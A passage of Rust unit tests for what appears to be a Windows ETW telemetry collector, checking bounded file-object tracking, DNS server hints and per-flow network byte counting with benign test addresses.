        for i in 0..(FILE_OBJECTS_MAX as u64 + 1) {
            t.observe(
                &file_rec(
                    12,
                    5,
                    1,
                    &[
                        ("FileObject", int(i, 8)),
                        ("FileName", s("C:\\f")),
                        ("CreateOptions", int(1 << 24, 4)),
                    ],
                ),
                &d,
            );
        }
        assert_eq!(t.overflows, 1);
        assert!(t.paths.len() <= FILE_OBJECTS_MAX);
    }

    fn dns_hint_rec(id: u16, name: &str, server: &str, ts: i64) -> EtwRecord {
        let mut r = rec(
            DNS_CLIENT,
            id,
            &[
                ("QueryName", s(name)),
                ("QueryType", int(1, 2)),
                ("DnsServerIpAddress", s(server)),
            ],
        );
        r.timestamp = ts;
        r
    }

    #[test]
    fn dns_server_comes_only_from_a_valid_query_sent_event() {
        let mut h = DnsServerHints::default();
        h.note(&dns_hint_rec(3010, "Example.COM.", "10.0.0.53", 100));
        h.note(&dns_hint_rec(3010, "bad.example", "not-an-ip", 100));
        h.note(&dns_hint_rec(3006, "ignored.example", "10.0.0.1", 100));
        assert_eq!(h.take("example.com", 1, 200).as_deref(), Some("10.0.0.53"));
        assert!(h.take("example.com", 1, 200).is_none(), "consumed once");
        assert!(h.take("bad.example", 1, 200).is_none());
        assert!(h.take("ignored.example", 1, 200).is_none());
        h.note(&dns_hint_rec(3011, "old.example", "[2001:db8::53]", 0));
        assert!(
            h.take("old.example", 1, DNS_HINT_TTL_TICKS + 1).is_none(),
            "stale"
        );
        for i in 0..(DNS_HINT_MAX + 5) {
            h.note(&dns_hint_rec(
                3010,
                &format!("h{i}.example"),
                "10.0.0.53",
                1,
            ));
        }
        assert!(h.map.len() <= DNS_HINT_MAX);
    }

    #[test]
    fn dns_completion_keeps_raw_status_and_invents_no_client_or_txid() {
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("x.example")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(9003, 4)),
            ],
        );
        let (_, d) = dns_query(&r).unwrap();
        assert_eq!(d.query_status, Some(9003));
        assert_eq!(
            (
                d.client_addr.as_str(),
                d.server_addr.as_str(),
                d.transaction_id
            ),
            ("", "", 0)
        );
    }

    fn net_rec(id: u16, size: u64, flip: bool) -> EtwRecord {
        let (l, r, lp, rp): ([u8; 4], [u8; 4], u16, u16) =
            ([10, 0, 0, 5], [93, 184, 216, 34], 51000, 443);
        let (sa, da, sp, dp) = if flip { (r, l, rp, lp) } else { (l, r, lp, rp) };
        let mut x = rec(
            KERNEL_NETWORK,
            id,
            &[
                ("PID", int(77, 4)),
                ("size", int(size, 4)),
                ("saddr", EtwValue::Int(0, sa.to_vec())),
                ("daddr", EtwValue::Int(0, da.to_vec())),
                ("sport", EtwValue::Int(0, sp.to_be_bytes().to_vec())),
                ("dport", EtwValue::Int(0, dp.to_be_bytes().to_vec())),
            ],
        );
        x.timestamp = 1_000_000_000;
        x
    }

    #[test]
    fn network_bytes_aggregate_per_flow_and_emit_on_close() {
        let mut f = NetFlows::default();
        let connect = net_rec(12, 0, false);
        let data = network_connection(&connect, None).unwrap();
        assert!(f.open(&data, connect.timestamp).is_none());
        assert!(f.observe(&net_rec(10, 100, false)).is_none());
        assert!(
            f.observe(&net_rec(10, 50, true)).is_none(),
            "other orientation, same flow"
        );
        assert!(f.observe(&net_rec(11, 4000, false)).is_none());
        let mut close = net_rec(13, 0, false);
        close.timestamp += 25_000_000;
        let c = f.observe(&close).unwrap();
        assert_eq!((c.bytes_sent, c.bytes_recv), (Some(150), Some(4000)));
        assert_eq!((c.state.as_str(), c.duration_ms), ("closed", Some(2500)));
        assert_eq!((c.dst_addr.as_str(), c.dst_port), ("93.184.216.34", 443));
        assert!(f.flows.is_empty() && f.order.is_empty());
        // Traffic of a flow that was never seen opening reports nothing.
        assert!(f.observe(&net_rec(10, 9, false)).is_none());
        assert_eq!(f.untracked, 1);
    }

    #[test]
    fn network_flow_table_is_bounded_and_flushes_evictions() {
        let mut f = NetFlows::default();
        let base = network_connection(&net_rec(12, 0, false), None).unwrap();
        let mut flushed = 0;
        for i in 0..(FLOWS_MAX as u16 + 3) {
            let mut d = base.clone();
            d.src_port = 1000 + i;
            if let Some(e) = f.open(&d, 1) {
                assert_eq!((e.state.as_str(), e.bytes_sent), ("open", Some(0)));
                flushed += 1;
            }
        }
        assert_eq!(flushed, 3);
        assert_eq!(f.flows.len(), FLOWS_MAX);
    }
}
